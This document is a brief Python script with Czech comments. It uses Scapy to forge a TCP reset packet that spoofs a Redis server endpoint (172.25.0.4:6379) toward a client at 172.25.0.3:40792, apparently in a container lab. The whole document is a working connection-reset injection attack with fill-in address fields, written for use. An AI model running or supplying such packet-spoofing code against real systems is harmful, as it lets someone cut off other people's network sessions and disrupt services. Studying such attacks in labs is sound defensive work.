from scapy.all import IP, TCP, send

# Zdrojová adresa, zdrojový port, cílová adresa a cílový port
src_ip = "172.25.0.4"  # Zde zadejte zdrojovou IP adresu
src_port = 6379  # Zde zadejte zdrojový port
dst_ip = "172.25.0.3"  # Zde zadejte cílovou IP adresu
dst_port = 40792  # Zde zadejte cílový port

# Vytvoření IP a TCP paketu s nastavením RST flagu a všemi definovanými parametry
packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="R")

# Odeslání paketu
send(packet)
